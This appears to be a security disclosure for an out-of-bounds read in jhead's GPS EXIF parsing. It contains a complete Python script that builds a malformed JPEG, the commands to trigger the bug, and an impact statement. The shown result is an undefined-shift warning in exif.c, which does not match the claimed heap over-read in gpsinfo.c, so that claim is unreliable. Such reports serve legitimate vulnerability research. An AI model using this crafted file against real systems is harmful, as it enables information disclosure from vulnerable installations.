## Bug0: GPS Lat/Long Out-of-Bounds Read via Under-counted Components

In `ProcessGpsInfo()` in `gpsinfo.c`, the boundary check validates only `Components * 8` bytes for GPS rational tags but the subsequent loop always iterates 3 times regardless of the declared `Components` count, causing an out-of-bounds read of up to 16 bytes into uninitialized heap memory when an attacker sets `Components=1`.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def le16(v):
    return struct.pack("<H", v)

def le32(v):
    return struct.pack("<I", v)

OUTPUT_FILE = "poc_input.jpg"

GPS_IFD_OFF  = 26
LAT_DATA_OFF = 40

BUG_COMPONENTS = 1  # should be 3

TAG_GPSINFO   = 0x8825
TAG_GPS_LAT   = 0x0002
FMT_LONG      = 4
FMT_URATIONAL = 5

tiff = bytearray()

# TIFF header (8 bytes)
tiff += b'II'
tiff += le16(0x002A)
tiff += le32(8)

# IFD0: 1 entry
tiff += le16(1)
tiff += le16(TAG_GPSINFO)
tiff += le16(FMT_LONG)
tiff += le32(1)
tiff += le32(GPS_IFD_OFF)
tiff += le32(0)

# GPS IFD: 1 entry
tiff += le16(1)
tiff += le16(TAG_GPS_LAT)
tiff += le16(FMT_URATIONAL)
tiff += le32(BUG_COMPONENTS)   # *** Components=1 (should be 3) — TRIGGER ***
tiff += le32(LAT_DATA_OFF)

# GPS lat rational data: only 1 component (8 bytes)
tiff += le32(51)   # numerator
tiff += le32(1)    # denominator

# Build APP1 section
exif_sig  = b'Exif\x00\x00'
app1_body = exif_sig + bytes(tiff)
app1_len  = len(app1_body) + 2

# Assemble JPEG
jpeg = bytearray()
jpeg += b'\xFF\xD8'
jpeg += b'\xFF\xE1'
jpeg += struct.pack(">H", app1_len)
jpeg += app1_body
jpeg += b'\xFF\xD9'

with open(OUTPUT_FILE, 'wb') as f:
    f.write(jpeg)

print(f"Wrote {len(jpeg)} bytes to {OUTPUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** exif.c:344:37: runtime error: left shift of negative value -66
    #0 0x55be7d6914a0 in Get32s
    #1 0x55be7d69f3e4 in ProcessGpsInfo

### Impact

An attacker can supply a crafted JPEG file with a GPS IFD entry where `TAG_GPS_LAT` or `TAG_GPS_LONG` declares `Components=1` instead of 3, causing `ProcessGpsInfo()` to read up to 16 bytes of uninitialized heap memory beyond the validated EXIF region. This constitutes an information disclosure vulnerability that may expose heap residue such as pointers or freed object contents, and it triggers undefined behavior (left shift of a negative value) that can be detected and leveraged for further heap layout analysis. The attack surface is any invocation of jhead on an untrusted JPEG file, requiring no special privileges or interactive exploitation beyond passing the file as an argument.
